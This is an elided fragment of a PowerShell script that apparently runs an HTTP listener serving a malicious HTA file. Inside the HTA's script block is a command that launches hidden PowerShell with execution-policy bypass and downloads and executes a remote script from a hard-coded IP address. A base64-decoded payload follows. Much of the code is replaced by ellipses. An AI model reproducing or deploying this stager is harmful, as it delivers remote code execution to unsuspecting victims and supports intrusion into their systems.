...
while ($true) {
    ...
    if ($request.Url -match '/app.hta$' -and ($request.HttpMethod -eq "GET")) {
		...
		<#
		  ...
		  <head>
			<script>
			var c = "cmd.exe /c powershell.exe -w hidden -ep bypass -c \"\"IEX ((new-object net.webclient).downloadstring('http://166.78.254.10/connect'))\"\"";
		...
		$apphta = ""
		
		
		$buffer = [System.Convert]::FromBase64String($apphta)
